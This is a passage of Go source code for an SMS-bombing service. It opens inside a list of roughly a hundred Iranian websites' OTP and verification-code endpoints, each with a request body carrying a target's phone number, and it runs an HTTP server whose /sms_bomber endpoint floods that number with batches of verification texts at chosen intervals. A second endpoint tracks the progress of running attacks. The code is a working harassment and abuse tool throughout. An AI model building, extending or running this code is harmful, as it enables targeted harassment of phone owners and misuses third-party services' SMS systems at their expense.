		{"https://behzadshami.com/wp-admin/admin-ajax.php", map[string]interface{}{"action": "digits_check_mob", "countrycode": "+98", "mobileNo": phone, "csrf": "3b4194a8bb", "login": "2", "username": "", "email": "", "captcha": "", "captcha_ses": "", "digits": "1", "json": "1", "whatsapp": "0", "digits_reg_فیلدمنتنی1642498931181": "Nvgu", "digregcode": "+98", "digits_reg_mail": phone}},
		{"https://api.tapsi.food/v1/api/Authentication/otp", map[string]interface{}{"cellPhone": "0" + cleanPhone}},
		{"https://api.pmxchange.co/api/User/Login/SendCode", map[string]interface{}{"phoneNumber": "0" + cleanPhone, "forPasswordCheck": true}},
		{"https://api.bimesho.com/api/v1/auth/otp/send", map[string]interface{}{"username": "0" + cleanPhone}},
		{"https://api.azkivam.com/auth/login", map[string]interface{}{"mobileNumber": "0" + cleanPhone}},
		{"https://api.komodaa.com/api/v2.6/loginRC/request", map[string]interface{}{"phone_number": "0" + cleanPhone}},
		{"https://tabdil24.net/api/api/v1/auth/login-register", map[string]interface{}{"emailOrMobile": "0" + cleanPhone}},
		{"https://www.vitrin.shop/api/v1/user/request_code", map[string]interface{}{"phone_number": "0" + cleanPhone, "forgot_password": false}},
		{"https://www.karnaval.ir/api-2/graphql", map[string]interface{}{"queryId": "0edebe0df353cee7f11614a37087371f", "variables": map[string]interface{}{"phone": "0" + cleanPhone, "isSecondAttempt": false}}},
		{"https://ids.tapsi.shop/authCustomer/CreateOtpForRegister", map[string]interface{}{"user": "0" + cleanPhone}},
		{"https://tap33.me/api/v2/user", map[string]interface{}{"credential": map[string]interface{}{"phoneNumber": "0" + cleanPhone, "role": "PASSENGER"}}},
		{"https://ws.alibaba.ir/api/v3/account/mobile/otp", map[string]interface{}{"phoneNumber": "0" + cleanPhone}},
		{"https://account.api.balad.ir/api/web/auth/login/", map[string]interface{}{"phone_number": "0" + cleanPhone, "os_type": "W"}},
		{"https://api.ostadkr.com/login", map[string]interface{}{"mobile": "0" + cleanPhone}},
		{"https://cyclops.drnext.ir/v1/patients/auth/send-verification-token", map[string]interface{}{"source": "besina", "mobile": "0" + cleanPhone}},
		{"https://bck.behtarino.com/api/v1/users/jwt_phone_verification/", map[string]interface{}{"phone": "0" + cleanPhone}},
		{"https://bit24.cash/auth/bit24/api/v3/auth/check-mobile", map[string]interface{}{"mobile": "0" + cleanPhone, "contry_code": "98"}},
		{"https://drdr.ir/api/v3/auth/login/mobile/init/", map[string]interface{}{"mobile": "0" + cleanPhone}},
		{"https://api.doctoreto.com/api/web/patient/v1/accounts/register", map[string]interface{}{"mobile": cleanPhone, "captcha": "", "country_id": 205}},
		{"https://api-react.okala.com/C/CustomerAccount/OTPRegister", map[string]interface{}{"mobile": "0" + cleanPhone, "deviceTypeCode": 0, "confirmTerms": true, "notRobot": false}},
		{"https://mobapi.banimode.com/api/v2/auth/request", map[string]interface{}{"phone": "0" + cleanPhone}},
		{"https://api.beroozmart.com/api/pub/account/send-otp", map[string]interface{}{"mobile": "0" + cleanPhone, "sendViaSms": true, "email": "null", "sendViaEmail": false}},
		{"https://app.itoll.com/api/v1/auth/login", map[string]interface{}{"mobile": "0" + cleanPhone}},
		{"https://pinket.com/api/cu/v2/phone-verification", map[string]interface{}{"phoneNumber": "0" + cleanPhone}},
		{"https://football360.ir/api/auth/verify-phone/", map[string]interface{}{"phone_number": "+98" + cleanPhone}},
		{"https://api.pinorest.com/frontend/auth/login/mobile", map[string]interface{}{"mobile": cleanPhone}},
		{"https://auth.mrbilit.com/api/login/exists/v2?mobileOrEmail=0" + cleanPhone + "&source=2&sendTokenIfNot=true", map[string]interface{}{}},
		{"https://www.hamrah-mechanic.com/api/v1/membership/otp", map[string]interface{}{"PhoneNumber": "0" + cleanPhone}},
		{"https://api.lendo.ir/api/customer/auth/send-otp", map[string]interface{}{"mobile": "0" + cleanPhone}},
		{"https://gw.taaghche.com/v4/site/auth/login", map[string]interface{}{"contact": "0" + cleanPhone, "forceOtp": false}},
		{"https://fidibo.com/user/login-by-sms", map[string]interface{}{"mobile_number": cleanPhone, "country_code": "ir"}},
		{"https://khodro45.com/api/v1/customers/otp/", map[string]interface{}{"mobile": "0" + cleanPhone}},
		{"https://api.pateh.com/ath/auth/login-or-register", map[string]interface{}{"mobile": "0" + cleanPhone}},
		{"https://ketabchi.com/api/v1/auth/requestVerificationCode", map[string]interface{}{"auth": map[string]interface{}{"phoneNumber": "0" + cleanPhone}}},
		{"https://bimito.com/api/vehicleorder/v2/app/auth/login-with-verify-code", map[string]interface{}{"phoneNumber": "0" + cleanPhone, "isResend": false}},
		{"https://api.pindo.ir/v1/user/login-register/", map[string]interface{}{"phone": "0" + cleanPhone}},
		{"https://www.delino.com/user/register", map[string]interface{}{"mobile": "0" + cleanPhone}},
		{"https://admin.zoodex.ir/api/v1/login/check", map[string]interface{}{"mobile": "0" + cleanPhone}},
		{"https://api.kukala.ir/api/user/Otp", map[string]interface{}{"phoneNumber": "0" + cleanPhone}},
		{"https://www.buskool.com/send_verification_code", map[string]interface{}{"phone": "0" + cleanPhone}},
		{"https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{"userKey": "98-" + cleanPhone, "userKeyType": 1}},
		{"https://api.pooleno.ir/v1/auth/check-mobile", map[string]interface{}{"mobile": "0" + cleanPhone}},
		{"https://agent.wide-app.ir/auth/token", map[string]interface{}{"grant_type": "otp", "client_id": "62b30c4af53e3b0cf100a4a0", "phone": "0" + cleanPhone}},
		{"https://nx.classino.com/otp/v1/api/login", map[string]interface{}{"mobile": "0" + cleanPhone}},
		{"https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass?lat=35.774&long=51.418&sms_apialClient=WEBSITE&client=WEBSITE&deviceType=WEBSITE&appVersion=8.1.0&UDID=39c62f64-3d2d-4954-9033-816098559ae4&locale=fa", map[string]interface{}{"cellphone": "0" + cleanPhone}},
		{"https://api.bitbarg.com/api/v1/authentication/registerOrLogin", map[string]interface{}{"phone": "0" + cleanPhone}},
		{"https://api.bahramshop.ir/api/user/validate/username", map[string]interface{}{"username": "0" + cleanPhone}},
		{"https://takshopaccessorise.ir/api/v1/sessions/login_request", map[string]interface{}{"mobile_phone": "0" + cleanPhone}},
		{"https://chamedoon.com/api/v1/membership/guest/request_mobile_verification", map[string]interface{}{"mobile": "0" + cleanPhone}},
		{"https://server.kilid.com/global_auth_api/v1.0/authenticate/login/realm/otp/start?realm=PORTAL", map[string]interface{}{"mobile": "0" + cleanPhone}},
		{"https://core.otaghak.com/odata/Otaghak/Users/SendVerificationCode", map[string]interface{}{"userName": "0" + cleanPhone}},
		{"https://api.shab.ir/api/fa/sandbox/v_1_4/auth/login-otp", map[string]interface{}{"mobile": "0" + cleanPhone, "country_code": "+98"}},
		{"https://api.raybit.net:3111/api/v1/authentication/register/mobile", map[string]interface{}{"mobile": "0" + cleanPhone}},
		{"https://farvi.shop/api/v1/sessions/login_request", map[string]interface{}{"mobile_phone": "0" + cleanPhone}},
		{"https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request", map[string]interface{}{"UserName": "0" + cleanPhone}},
		{"https://a4baz.com/api/web/login", map[string]interface{}{"cellphone": "0" + cleanPhone}},
		{"https://api.anargift.com/api/people/auth", map[string]interface{}{"user": "0" + cleanPhone}},
		{"https://nobat.ir/api/public/patient/login/phone", map[string]interface{}{"mobile": "0" + cleanPhone}},
		{"https://www.riiha.ir/api/v1.0/authenticate", map[string]interface{}{"mobile": "0" + cleanPhone, "mobile_code": "", "type": "mobile"}},
		{"https://api.mohit.online/api/auth/login", map[string]interface{}{"username": "0" + cleanPhone, "app": "market", "token": ""}},
		{"https://auth.mrbilit.ir/api/Token/send?mobile=0" + cleanPhone, map[string]interface{}{}},
		{"https://www.sheypoor.com/api/v10.0.0/auth/send", map[string]interface{}{"username": "0" + cleanPhone}},
		{"https://www.simkhanapi.ir/api/users/registerV2", map[string]interface{}{"mobileNumber": "0" + cleanPhone}},
		{"https://sandbox.sibirani.ir/api/v1/user/invite", map[string]interface{}{"username": "0" + cleanPhone}},
		{"https://shop.hyperjan.ir/api/users/manage", map[string]interface{}{"mobile": "0" + cleanPhone}},
		{"https://api.digikala.com/v1/user/authenticate/", map[string]interface{}{"username": "0" + cleanPhone}},
		{"https://hiword.ir/wp-json/otp-login/v1/login", map[string]interface{}{"identifier": "0" + cleanPhone}},
		{"https://tikban.com/Account/LoginAndRegister", map[string]interface{}{"cellPhone": "0" + cleanPhone}},
		{"https://dicardo.com/main/sendsms", map[string]interface{}{"phone": "0" + cleanPhone}},
		{"https://www.digistyle.com/users/login-register/", map[string]interface{}{"loginRegister[email_phone]": "0" + cleanPhone}},
		{"https://banankala.com/home/login", map[string]interface{}{"Mobile": "0" + cleanPhone}},
		{"https://www.offdecor.com/index.php?route=account/login/sendCode", map[string]interface{}{"phone": "0" + cleanPhone}},
		{"https://exo.ir/index.php?route=account/mobile_login", map[string]interface{}{"mobile_number": "0" + cleanPhone}},
		{"https://shahrfarsh.com/Account/Login", map[string]interface{}{"phoneNumber": "0" + cleanPhone}},
		{"https://takfarsh.com/wp-content/themes/bakala/template-parts/send.php", map[string]interface{}{"phone_email": "0" + cleanPhone}},
		{"https://rojashop.com/api/auth/sendOtp", map[string]interface{}{"mobile": "0" + cleanPhone}},
		{"https://dadpardaz.com/advice/getLoginConfirmationCode", map[string]interface{}{"mobile": "0" + cleanPhone}},
		{"https://api.rokla.ir/api/request/otp", map[string]interface{}{"mobile": "0" + cleanPhone}},
		{"https://api.pezeshket.com/core/v1/auth/requestCode", map[string]interface{}{"mobileNumber": "0" + cleanPhone}},
		{"https://virgool.io/api/v1.4/auth/verify", map[string]interface{}{"method": "phone", "identifier": "0" + cleanPhone}},
		{"https://api.timcheh.com/auth/otp/send", map[string]interface{}{"mobile": "0" + cleanPhone}},
		{"https://client.api.paklean.com/user/resendCode", map[string]interface{}{"username": "0" + cleanPhone}},
		{"https://daal.co/api/authentication/login-register/method/phone-otp/user-role/customer/verify-request", map[string]interface{}{"phone": "0" + cleanPhone}},
		{"https://bimebazar.com/accounts/api/login_sec/", map[string]interface{}{"username": "0" + cleanPhone}},
		{"https://www.azki.co/api/vehicleorder/v2/app/auth/check-login-availability/", map[string]interface{}{"phoneNumber": "0" + cleanPhone}},
		{"https://safarmarket.com//api/security/v2/user/otp", map[string]interface{}{"phone": "0" + cleanPhone}},
		{"https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=" + cleanPhone, map[string]interface{}{}},
		{"https://api.chartex.net/api/v2/user/validate", map[string]interface{}{"mobile": "0" + cleanPhone, "country_code": "IR", "provider_code": "RUBIKA"}},
		{"https://www.snapptrip.com/register", map[string]interface{}{"lang": "fa", "country_id": "860", "password": "snaptrippass", "mobile_phone": "0" + cleanPhone, "country_code": "+98", "email": "example@gmail.com"}},
		{"https://api.bitpin.ir/v3/usr/authenticate/", map[string]interface{}{"device_type": "web", "password": "test123", "phone": "0" + cleanPhone}},
		{"https://www.pubisha.com/login/checkCustomerActivation", map[string]interface{}{"mobile": "0" + cleanPhone}},
		{"https://api.snapp.doctor/core/Api/Common/v1/sendVerificationCode/0" + cleanPhone + "/sms?cCode=%2B98", map[string]interface{}{}},
		{"https://dastkhat-isad.ir/api/v1/user/store", map[string]interface{}{"mobile": cleanPhone, "countryCode": 98, "device_os": 2}},
		{"https://irwco.ir/register", map[string]interface{}{"mobile": "0" + cleanPhone}},
		{"https://api.sibbank.ir/v1/auth/login", map[string]interface{}{"phone_number": "0" + cleanPhone}},
		{"https://api.arshiyan.com/send_code", map[string]interface{}{"country_code": "98", "phone_number": cleanPhone}},
		{"https://backend.topnoor.ir/web/v1/user/otp", map[string]interface{}{"mobile": "0" + cleanPhone}},
		{"https://api.alinance.com/user/register/mobile/send/", map[string]interface{}{"phone_number": "0" + cleanPhone}},
		{"https://api.alopeyk.com/api/v2/login?platform=pwa", map[string]interface{}{"type": "CUSTOMER", "phone": "0" + cleanPhone}},
		{"https://api.alopeyk.com/safir-service/api/v1/login", map[string]interface{}{"phone": "0" + cleanPhone}},
		{"https://ghasedak24.com/user/ajax_register", map[string]interface{}{"username": "0" + cleanPhone}},
		{"https://www.iranketab.ir/account/register", map[string]interface{}{"UserName": "0" + cleanPhone}},
		{"https://api.iranicard.ir/api/v1/register", map[string]interface{}{"mobile": "0" + cleanPhone}},
		{"https://tj8.ir/auth/register", map[string]interface{}{"mobile": "0" + cleanPhone}},
		{"https://mashinbank.com/api2/users/check", map[string]interface{}{"mobileNumber": "0" + cleanPhone}},
		{"https://cinematicket.org/api/v1/users/signup", map[string]interface{}{"phone_number": "0" + cleanPhone}},
		{"https://kafegheymat.com/shop/getLoginSms", map[string]interface{}{"phone": "0" + cleanPhone}},
		{"https://api.snapp.express/mobile/v4/user/loginMobileWithNoPass?client=PWA&optionalClient=PWA&deviceType=PWA&appVersion=5.6.6", map[string]interface{}{"cellphone": "0" + cleanPhone}},
		{"https://shop.opco.co.ir/index.php?route=extension/module/login_verify/update_register_code", map[string]interface{}{"telephone": "0" + cleanPhone}},
		{"https://melix.shop/site/api/v1/user/otp", map[string]interface{}{"mobile": "0" + cleanPhone}},
		{"https://safiran.shop/login", map[string]interface{}{"mobile": "0" + cleanPhone}},
		{"https://api.digikalajet.ir/user/login-register/", map[string]interface{}{"phone": "0" + cleanPhone}},
		{"https://api.offch.com/auth/otp", map[string]interface{}{"username": "0" + cleanPhone}},
	}
}

func handleSmsBombing(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		writeJSON(w, http.StatusMethodNotAllowed, apiError{Error: "method not allowed"})
		return
	}

	var data RequestData
	if err := json.NewDecoder(r.Body).Decode(&data); err != nil {
		writeJSON(w, http.StatusBadRequest, apiError{Error: "invalid JSON body"})
		return
	}

	if strings.TrimSpace(data.PhoneNumber) == "" {
		writeJSON(w, http.StatusBadRequest, apiError{Error: "شماره تلفن الزامی است."})
		return
	}

	if val, exists := activeSessions.Load(data.PhoneNumber); exists {
		if status, ok := val.(*SessionStatus); ok && status.IsRunning {
			writeJSON(w, http.StatusConflict, apiError{
				Error: fmt.Sprintf("یک عملیات برای این شماره در حال اجراست. مرحله %d از %d",
					status.CompletedBatches, status.TotalBatches),
			})
			return
		}
	}

	targets := seedTargets(data.PhoneNumber)
	if len(targets) == 0 {
		writeJSON(w, http.StatusInternalServerError, apiError{Error: "هیچ سرویس پیامکی تعریف نشده است."})
		return
	}

	batchSize := data.BatchSize
	if batchSize <= 0 {
		batchSize = len(targets)
	}

	interval := time.Duration(data.IntervalMinutes) * time.Minute
	totalBatches := data.TotalBatches
	if data.TotalBatches <= 0 {
		writeJSON(w, http.StatusBadRequest, apiError{Error: "تعداد مراحل (total_batches) باید حداقل 1 باشد."})
		return
	}

	if data.IntervalMinutes < 0 {
		writeJSON(w, http.StatusBadRequest, apiError{Error: "فاصله زمانی نمی‌تواند منفی باشد."})
		return
	}

	go runSmsBombing(data.PhoneNumber, targets, batchSize, interval, totalBatches)

	intervalInfo := "بدون وقفه"
	if data.IntervalMinutes > 0 {
		intervalInfo = fmt.Sprintf("هر %d دقیقه", data.IntervalMinutes)
	}

	writeJSON(w, http.StatusOK, map[string]interface{}{
		"status":  "success",
		"message": fmt.Sprintf("عملیات شروع شد! تعداد مراحل: %d، فاصله: %s، اندازه هر مرحله: %d پیام", totalBatches, intervalInfo, batchSize),
		"details": map[string]interface{}{
			"phone_number":   data.PhoneNumber,
			"total_services": len(targets),
			"batch_size":     batchSize,
			"total_batches":  totalBatches,
			"interval":       intervalInfo,
		},
	})
}

func handleSmsStatus(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		writeJSON(w, http.StatusMethodNotAllowed, apiError{Error: "method not allowed"})
		return
	}

	phone := r.URL.Query().Get("phone")
	if phone == "" {
		// Return all active sessions
		var sessions []SessionStatus
		activeSessions.Range(func(key, value interface{}) bool {
			if status, ok := value.(*SessionStatus); ok {
				sessions = append(sessions, *status)
			}
			return true
		})
		writeJSON(w, http.StatusOK, map[string]interface{}{
			"active_sessions": sessions,
		})
		return
	}

	// Return specific session
	if val, exists := activeSessions.Load(phone); exists {
		if status, ok := val.(*SessionStatus); ok {
			writeJSON(w, http.StatusOK, status)
			return
		}
	}

	writeJSON(w, http.StatusNotFound, apiError{Error: "هیچ عملیاتی برای این شماره یافت نشد."})
}

func handleHealthz(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		writeJSON(w, http.StatusMethodNotAllowed, apiError{Error: "method not allowed"})
		return
	}
	writeJSON(w, http.StatusOK, map[string]string{"status": "ok"})
}

func main() {
	mux := http.NewServeMux()
	mux.Handle("/sms_bomber", withJSONHeaders(http.HandlerFunc(handleSmsBombing)))
	mux.Handle("/sms_status", withJSONHeaders(http.HandlerFunc(handleSmsStatus)))
	mux.Handle("/send_emails", withJSONHeaders(http.HandlerFunc(handleSendEmails)))
	mux.Handle("/healthz", withJSONHeaders(http.HandlerFunc(handleHealthz)))

	log.Println("🚀 سرور در حال اجرا روی پورت :8080")
	// log.Println("📡 Endpoints:")
	// log.Println("   POST /sms_bomber   - شروع عملیات پیامک")
	// log.Println("   POST /send_emails  - ارسال ایمیل‌ها")
	// log.Println("   GET  /sms_status   - بررسی وضعیت عملیات")
	// log.Println("   GET  /healthz      - بررسی سلامت سرور")
	if err := http.ListenAndServe(":8080", mux); err != nil {
		log.Fatalf("listen and serve: %v", err)
	}
}

func sms(url string, header map[string]interface{}, ch chan<- int) {
	jsonData, err := json.Marshal(header)
	if err != nil {
		ch <- http.StatusInternalServerError
		return
	}
	time.Sleep(2 * time.Second)
	resp, err := http.Post(url, "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		ch <- http.StatusInternalServerError
		return
	}
	defer resp.Body.Close()
	io.ReadAll(resp.Body)
	ch <- resp.StatusCode
}
